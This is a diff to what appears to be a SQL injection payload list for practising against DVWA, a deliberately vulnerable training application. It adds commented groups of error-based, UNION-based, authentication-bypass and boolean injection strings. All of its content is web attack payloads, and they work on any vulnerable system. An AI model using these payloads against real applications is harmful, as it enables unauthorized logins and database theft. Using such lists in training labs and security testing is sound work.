@@ -1,12 +1,29 @@
+# SQL Injection Payloads for DVWA (Low/Medium Security)
+# One payload per line. Lines starting with # are comments.
+
+# --- Error-based payloads ---
+'
 ' OR '1'='1
 ' OR 1=1 --
 " OR "1"="1
-' UNION SELECT NULL, NULL --
 ' OR 1=1#
 ' OR 1=1/*
 ') OR ('1'='1
-admin' -- -- Time-based detection payloads
--- MSSQL specific errors
--- UNION-based SQL injection patterns
--- Stacked query detection payloads
--- Blind SQL injection time-based detection
+' OR 1=1 LIMIT 1 --
+
+# --- UNION-based payloads ---
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+
+# --- Authentication bypass ---
+admin' --
+admin'#
+' OR 'x'='x
+
+# --- Boolean-based ---
+1 AND 1=1
+1 AND 1=2
